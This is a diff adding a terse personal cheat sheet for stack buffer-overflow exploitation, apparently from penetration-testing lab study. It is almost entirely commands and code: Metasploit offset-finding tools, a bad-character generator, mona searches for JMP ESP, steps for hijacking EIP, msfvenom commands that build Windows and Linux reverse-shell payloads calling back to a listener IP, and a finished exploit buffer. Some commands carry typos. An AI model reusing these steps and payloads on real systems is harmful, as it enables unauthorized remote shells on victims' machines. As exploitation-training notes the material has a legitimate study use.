@@ -1,0 +1,59 @@
+Bytes to break            = 
+break Confirmed         = 
+Exact Location            = 
+overwrite confirmed    = 
+Shellcode space          = 
+badchars                    = 
+opcode                       = 
+opcode hex                 = 
+operation address        = 
+little endian address    = 
+
+
+Find Offset
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 
+
+Find BadChar
+http://www.whatasciicode.com/p/ascii-code-table.html
+c = ""
+cl = []
+badchar = [0x00]
+for ch in range (0x00 , 0xFF+1):
+        if ch not in badchar:
+                cl.append(chr(ch))
+for i in cl:
+        c += i
+input(c)
+#buffer = c + ("A" * (2288 - len(c))) + ("B" * 4) + ("C" * 1800)
+
+to find JMP ESP
+    !mona jmp -r esp -cpb “\x00\x0A”        << bad charachters
+        ^^^ may lead you right to it
+    !mona modules
+        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)
+        !mona find -s “\xff\xe4” -m yeet.dll
+            ^^^Look at address
+      if all else fails in the top left pane Ctrl f for JMP ESP
+
+      If ESP is too small for shellcode, 
+        1. see where you can write to (EAX, EBX, ECX)
+        2. find what exe\dll you can abuse (!mona modules)
+        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     
+        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)
+        5. Take the register address of that function and overwrite EIP with that (in little endian)
+        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)("\xFF\xD1\x90\x90") not little endian
+        7. drop your shell code where you are able to write with nulls around it.
+
+to find opcodes
+    msf-nasm_shell
+        JMP xxx
+        CALL xxx
+      
+Payload
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper > payload.txt
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b '\x00\x0A\x0D\x25\x26\x2B\x3D' -e x86/shikata_ga_nai
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b '\x00\x0A\x0D\x25\x26\x2B\x3D' -e x86/shikata_ga_nai exitfuc=thread
+     msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x0 0\x20" -f py -v shellcode 
+buffer = ("A" * 2288) + "\xcf\x10\x80\x14" +  "\xff\xE4\x90\x90" + ("\x90" * 20) + payload + ("\x90" * 20)
+    
